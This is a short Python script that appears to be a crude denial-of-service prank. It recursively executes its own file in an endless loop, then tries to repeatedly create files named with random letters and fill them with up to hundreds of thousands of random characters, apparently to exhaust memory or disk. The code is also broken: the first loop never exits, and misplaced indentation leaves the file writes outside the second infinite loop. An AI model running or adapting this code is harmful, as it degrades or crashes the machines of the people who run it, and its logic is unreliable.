import random
import string

while 1:
    exec(open('main.py').read())

length_of_string = random.choice(range(1, 100))
random_string = "".join(random.choice(string.ascii_letters) for i in range(length_of_string))

length_of_string2 = random.choice(range(1, 100000))
random_string2 = "".join(random.choice(string.ascii_letters) for i in range(length_of_string2))

while 1:
  f = open(random_string, "w+")
f.write(random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2)
f.close()
